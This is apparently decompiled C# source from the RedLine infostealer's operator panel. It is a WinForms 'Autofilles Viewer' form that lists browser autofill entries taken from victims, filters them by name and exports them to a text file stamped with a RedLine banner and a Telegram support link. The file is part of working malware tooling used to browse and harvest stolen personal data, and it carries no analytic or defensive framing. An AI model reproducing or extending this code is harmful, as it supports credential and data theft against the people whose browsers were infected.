using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using GuiLib;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class AutofillesViewer : Form
{
	[CompilerGenerated]
	private object object_0;

	private object object_1;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object autofillesListView;

	private object nameDataGridViewTextBoxColumn;

	private object valueDataGridViewTextBoxColumn;

	private object object_2;

	private object searchTb;

	private object m_a;

	private object m_b;

	private object c;

	private BindingList<Autofill> Autofills
	{
		[CompilerGenerated]
		get
		{
			return (BindingList<Autofill>)object_0;
		}
		[CompilerGenerated]
		set
		{
			object_0 = value;
		}
	}

	public AutofillesViewer(BindingList<Autofill> _pairs)
	{
		a();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		Autofills = _pairs;
		((DataGridView)autofillesListView).DataSource = Autofills;
	}

	private void closeBtn_Click(object sender, object e)
	{
		Close();
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void AutofillesViewer_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void c_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchTb).Text))
		{
			return;
		}
		BindingList<Autofill> bindingList = new BindingList<Autofill>();
		foreach (Autofill autofill in Autofills)
		{
			if (autofill.Name.Contains(((AnimaTextBox)searchTb).Text))
			{
				bindingList.Add(autofill);
			}
		}
		((DataGridView)autofillesListView).DataSource = bindingList;
	}

	private void searchTb_TextChanged(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)searchTb).Text))
		{
			((DataGridView)autofillesListView).DataSource = Autofills;
		}
	}

	private async void a_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
				saveFileDialog.DefaultExt = ".txt";
				saveFileDialog.CheckPathExists = true;
				saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
				saveFileDialog.RestoreDirectory = true;
				if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
				{
					int num = 0;
					StringBuilder stringBuilder = new StringBuilder();
					BindingList<Autofill> bindingList = ((DataGridView)autofillesListView).DataSource as BindingList<Autofill>;
					stringBuilder.AppendLine("***********************************************\r\n*                                             *\r\n*   ____  _____ ____  _     ___ _   _ _____   *\r\n*  |  _ \\| ____|  _ \\| |   |_ _| \\ | | ____|  *\r\n*  | |_) |  _| | | | | |    | ||  \\| |  _|    *\r\n*  |  _ <| |___| |_| | |___ | || |\\  | |___   *\r\n*  |_| \\_|_____|____/|_____|___|_| \\_|_____|  *\r\n*                                             *\r\n*    Telegram: https://t.me/REDLINESUPPORT    *\r\n***********************************************");
					stringBuilder.Append(Environment.NewLine);
					foreach (Autofill item in bindingList)
					{
						stringBuilder.Append("Name: ").Append(item.Name).Append(Environment.NewLine)
							.Append("Value: ")
							.Append(item.Value)
							.Append(Environment.NewLine)
							.Append((num < bindingList.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
						num++;
					}
					File.AppendAllText(saveFileDialog.FileName, stringBuilder.ToString());
					MessageBox.Show(this, "Successfully saved to file");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_1 != null)
		{
			((IDisposable)object_1).Dispose();
		}
		base.Dispose(disposing);
	}

	private void a()
	{
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		object_1 = new Container();
		DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle4 = new DataGridViewCellStyle();
		DataGridViewCellStyle dataGridViewCellStyle5 = new DataGridViewCellStyle();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AutofillesViewer));
		topHeader = new Panel();
		mainTitle = new Label();
		closeBtn = new Label();
		autofillesListView = new DataGridView();
		nameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		valueDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		object_2 = new BindingSource((IContainer)object_1);
		searchTb = (object)new AnimaTextBox();
		this.m_a = (object)new MetroSetButton();
		this.m_b = new Label();
		c = (object)new MetroSetButton();
		((Control)topHeader).SuspendLayout();
		((ISupportInitialize)autofillesListView).BeginInit();
		((ISupportInitialize)object_2).BeginInit();
		SuspendLayout();
		((Control)topHeader).BackColor = Color.FromArgb(52, 56, 67);
		((Control)topHeader).Controls.Add((Control)mainTitle);
		((Control)topHeader).Controls.Add((Control)closeBtn);
		((Control)topHeader).Dock = DockStyle.Top;
		((Control)topHeader).ForeColor = Color.Silver;
		((Control)topHeader).Location = new Point(0, 0);
		((Control)topHeader).Name = "topHeader";
		((Control)topHeader).Size = new Size(518, 30);
		((Control)topHeader).TabIndex = 3;
		((Control)topHeader).Paint += topHeader_Paint;
		((Control)mainTitle).AutoSize = true;
		((Control)mainTitle).Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)mainTitle).ForeColor = Color.Red;
		((Control)mainTitle).Location = new Point(3, 4);
		((Control)mainTitle).Name = "mainTitle";
		((Control)mainTitle).Size = new Size(186, 20);
		((Control)mainTitle).TabIndex = 2;
		((Control)mainTitle).Text = "RedLine | Autofilles Viewer";
		((Control)closeBtn).AutoSize = true;
		((Control)closeBtn).Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
		((Control)closeBtn).ForeColor = Color.White;
		((Control)closeBtn).Location = new Point(495, 4);
		((Control)closeBtn).Name = "closeBtn";
		((Control)closeBtn).Size = new Size(20, 21);
		((Control)closeBtn).TabIndex = 1;
		((Control)closeBtn).Text = "X";
		((Control)closeBtn).Click += closeBtn_Click;
		((DataGridView)autofillesListView).AllowUserToAddRows = false;
		((DataGridView)autofillesListView).AllowUserToDeleteRows = false;
		((DataGridView)autofillesListView).AllowUserToResizeColumns = false;
		((DataGridView)autofillesListView).AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle.ForeColor = Color.Silver;
		dataGridViewCellStyle.WrapMode = DataGridViewTriState.False;
		((DataGridView)autofillesListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		((DataGridView)autofillesListView).AutoGenerateColumns = false;
		((DataGridView)autofillesListView).BackgroundColor = Color.FromArgb(52, 56, 67);
		((DataGridView)autofillesListView).BorderStyle = BorderStyle.None;
		((DataGridView)autofillesListView).CellBorderStyle = DataGridViewCellBorderStyle.RaisedVertical;
		((DataGridView)autofillesListView).ClipboardCopyMode = DataGridViewClipboardCopyMode.Disable;
		((DataGridView)autofillesListView).ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle2.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = Color.Silver;
		dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
		((DataGridView)autofillesListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		((DataGridView)autofillesListView).ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((DataGridView)autofillesListView).Columns.AddRange((DataGridViewColumn)nameDataGridViewTextBoxColumn, (DataGridViewColumn)valueDataGridViewTextBoxColumn);
		((DataGridView)autofillesListView).DataSource = object_2;
		dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle3.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle3.ForeColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle3.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
		((DataGridView)autofillesListView).DefaultCellStyle = dataGridViewCellStyle3;
		((DataGridView)autofillesListView).EditMode = DataGridViewEditMode.EditOnEnter;
		((DataGridView)autofillesListView).EnableHeadersVisualStyles = false;
		((DataGridView)autofillesListView).GridColor = Color.FromArgb(52, 60, 67);
		((Control)autofillesListView).Location = new Point(7, 36);
		((DataGridView)autofillesListView).MultiSelect = false;
		((Control)autofillesListView).Name = "autofillesListView";
		((DataGridView)autofillesListView).ReadOnly = true;
		((DataGridView)autofillesListView).RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle4.Font = new Font("Segoe UI", 9f);
		dataGridViewCellStyle4.ForeColor = Color.Silver;
		dataGridViewCellStyle4.SelectionBackColor = SystemColors.Highlight;
		dataGridViewCellStyle4.SelectionForeColor = SystemColors.HighlightText;
		dataGridViewCellStyle4.WrapMode = DataGridViewTriState.True;
		((DataGridView)autofillesListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		((DataGridView)autofillesListView).RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle5.Alignment = DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle5.ForeColor = Color.Silver;
		((DataGridView)autofillesListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
		((DataGridView)autofillesListView).RowTemplate.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
		((DataGridView)autofillesListView).RowTemplate.DefaultCellStyle.BackColor = Color.FromArgb(52, 56, 67);
		((DataGridView)autofillesListView).RowTemplate.DefaultCellStyle.ForeColor = Color.Silver;
		((DataGridView)autofillesListView).ScrollBars = ScrollBars.Vertical;
		((DataGridView)autofillesListView).SelectionMode = DataGridViewSelectionMode.FullRowSelect;
		((DataGridView)autofillesListView).ShowEditingIcon = false;
		((Control)autofillesListView).Size = new Size(500, 483);
		((Control)autofillesListView).TabIndex = 17;
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).DataPropertyName = "Name";
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).HeaderText = "Name";
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).Name = "nameDataGridViewTextBoxColumn";
		((DataGridViewBand)nameDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)nameDataGridViewTextBoxColumn).Width = 200;
		((DataGridViewColumn)valueDataGridViewTextBoxColumn).DataPropertyName = "Value";
		((DataGridViewColumn)valueDataGridViewTextBoxColumn).HeaderText = "Value";
		((DataGridViewColumn)valueDataGridViewTextBoxColumn).Name = "valueDataGridViewTextBoxColumn";
		((DataGridViewBand)valueDataGridViewTextBoxColumn).ReadOnly = true;
		((DataGridViewColumn)valueDataGridViewTextBoxColumn).Width = 250;
		((BindingSource)object_2).DataSource = typeof(Autofill);
		((AnimaTextBox)searchTb).Dark = false;
		((Control)searchTb).Location = new Point(13, 548);
		((AnimaTextBox)searchTb).MaxLength = 32767;
		((AnimaTextBox)searchTb).MultiLine = false;
		((Control)searchTb).Name = "searchTb";
		((AnimaTextBox)searchTb).Numeric = false;
		((AnimaTextBox)searchTb).ReadOnly = false;
		((Control)searchTb).Size = new Size(383, 23);
		((Control)searchTb).TabIndex = 36;
		((AnimaTextBox)searchTb).UseSystemPasswordChar = false;
		((Control)searchTb).TextChanged += searchTb_TextChanged;
		((MetroSetButton)this.m_a).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.m_a).DisabledForeColor = Color.Gray;
		((Control)this.m_a).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.m_a).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.m_a).HoverTextColor = Color.White;
		((Control)this.m_a).Location = new Point(402, 525);
		((Control)this.m_a).Name = "saveBtn";
		((MetroSetButton)this.m_a).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.m_a).NormalTextColor = Color.White;
		((MetroSetButton)this.m_a).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.m_a).PressTextColor = Color.White;
		((Control)this.m_a).Size = new Size(102, 20);
		((MetroSetButton)this.m_a).Style = (Style)0;
		((MetroSetButton)this.m_a).StyleManager = null;
		((Control)this.m_a).TabIndex = 35;
		((Control)this.m_a).Text = "Save list";
		((MetroSetButton)this.m_a).ThemeAuthor = "Narwin";
		((MetroSetButton)this.m_a).ThemeName = "MetroLite";
		((Control)this.m_a).Click += a_Click;
		((Control)this.m_b).AutoSize = true;
		((Control)this.m_b).Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)this.m_b).ForeColor = Color.White;
		((Control)this.m_b).Location = new Point(15, 530);
		((Control)this.m_b).Name = "label1";
		((Control)this.m_b).Size = new Size(79, 15);
		((Control)this.m_b).TabIndex = 34;
		((Control)this.m_b).Text = "Enter a name:";
		((MetroSetButton)c).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)c).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)c).DisabledForeColor = Color.Gray;
		((Control)c).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)c).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)c).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)c).HoverTextColor = Color.White;
		((Control)c).Location = new Point(402, 551);
		((Control)c).Name = "clearBtn";
		((MetroSetButton)c).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)c).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)c).NormalTextColor = Color.White;
		((MetroSetButton)c).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)c).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)c).PressTextColor = Color.White;
		((Control)c).Size = new Size(102, 20);
		((MetroSetButton)c).Style = (Style)0;
		((MetroSetButton)c).StyleManager = null;
		((Control)c).TabIndex = 33;
		((Control)c).Text = "Search";
		((MetroSetButton)c).ThemeAuthor = "Narwin";
		((MetroSetButton)c).ThemeName = "MetroLite";
		((Control)c).Click += c_Click;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(52, 56, 67);
		base.ClientSize = new Size(518, 581);
		base.Controls.Add((Control)searchTb);
		base.Controls.Add((Control)this.m_a);
		base.Controls.Add((Control)this.m_b);
		base.Controls.Add((Control)c);
		base.Controls.Add((Control)autofillesListView);
		base.Controls.Add((Control)topHeader);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "AutofillesViewer";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "RedLine | Autofilles Viewer";
		base.Paint += AutofillesViewer_Paint;
		((Control)topHeader).ResumeLayout(performLayout: false);
		((Control)topHeader).PerformLayout();
		((ISupportInitialize)autofillesListView).EndInit();
		((ISupportInitialize)object_2).EndInit();
		ResumeLayout(performLayout: false);
		PerformLayout();
	}

	[CompilerGenerated]
	private void b()
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
			saveFileDialog.DefaultExt = ".txt";
			saveFileDialog.CheckPathExists = true;
			saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			saveFileDialog.RestoreDirectory = true;
			if (saveFileDialog.ShowDialog(this) != DialogResult.OK)
			{
				return;
			}
			int num = 0;
			StringBuilder stringBuilder = new StringBuilder();
			BindingList<Autofill> bindingList = ((DataGridView)autofillesListView).DataSource as BindingList<Autofill>;
			stringBuilder.AppendLine("***********************************************\r\n*                                             *\r\n*   ____  _____ ____  _     ___ _   _ _____   *\r\n*  |  _ \\| ____|  _ \\| |   |_ _| \\ | | ____|  *\r\n*  | |_) |  _| | | | | |    | ||  \\| |  _|    *\r\n*  |  _ <| |___| |_| | |___ | || |\\  | |___   *\r\n*  |_| \\_|_____|____/|_____|___|_| \\_|_____|  *\r\n*                                             *\r\n*    Telegram: https://t.me/REDLINESUPPORT    *\r\n***********************************************");
			stringBuilder.Append(Environment.NewLine);
			foreach (Autofill item in bindingList)
			{
				stringBuilder.Append("Name: ").Append(item.Name).Append(Environment.NewLine)
					.Append("Value: ")
					.Append(item.Value)
					.Append(Environment.NewLine)
					.Append((num < bindingList.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
				num++;
			}
			File.AppendAllText(saveFileDialog.FileName, stringBuilder.ToString());
			MessageBox.Show(this, "Successfully saved to file");
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}
}
